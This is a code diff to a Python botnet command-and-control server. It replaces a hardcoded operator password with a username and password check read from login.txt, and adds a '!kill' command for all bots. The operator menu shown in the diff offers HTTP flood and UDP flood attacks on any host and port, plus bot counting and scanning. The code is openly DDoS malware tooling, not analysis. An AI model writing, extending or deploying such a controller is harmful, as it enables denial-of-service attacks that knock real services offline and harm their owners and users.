@@ -21,7 +21,6 @@ import sys
 from os import system, name
 import base64 as b64
 
-password = "Leeon123"#Your login password
 key= "asdfghjkloiuytresxcvbnmliuytf"#xor key
 
 if len(sys.argv)<=1:
@@ -91,11 +90,11 @@ def waitConnect(sock,addr):
 		else:
 			sock.close()
 	except:
-		if passwd == password + "\r\n" or passwd == password:#if password is 'Leeon123' then it will login to cnc
+		if passwd == "Login\r\n" or passwd == "Login":#login code
 		#If u are using putty pls use raw mode to connect, 
 		#If connected, there will not show anything on screen
-		#Just input 'Leeon123' and enter.
-			print("Commander is here")
+		#Just input 'Login' and enter.
+			print("Somebody login...")
 			Commander(sock)
 		else:
 			sock.close()
@@ -103,6 +102,22 @@ def waitConnect(sock,addr):
 def Commander(sock):#cnc server
 	global so
 	so = sock
+	sock.send("Username:".encode())
+	name = sock.recv(1024).decode()
+	sock.send("Password:".encode())
+	passwd = sock.recv(1024).decode()
+	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
+	corret=0
+	for x in tmp:
+		tmp2 = x.split()
+		#print(tmp2[0])#debug
+		#print(tmp2[1])#
+		if tmp2[0]+"\r\n" == name and tmp2[1]+"\r\n" == passwd:
+			print("Commander here: "+tmp2[0])
+			corret+=1
+	if corret != 1:
+		sock.close()
+		return
 	sock.send("Setting up the server\r\n".encode())#loading sense
 	time.sleep(0.5)
 	sock.send("\033[2J\033[1H".encode())
@@ -160,6 +175,7 @@ def Commander(sock):#cnc server
 				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())    #http flood
 				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
 				sock.send('    !stop    : stop attack\r\n'.encode())
+				sock.send('    !kill    : kill all the bots\r\n'.encode())
 				sock.send('    bots     : count bot\r\n'.encode())
 				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
 				sock.send('    clear    : Clear screen\r\n'.encode())
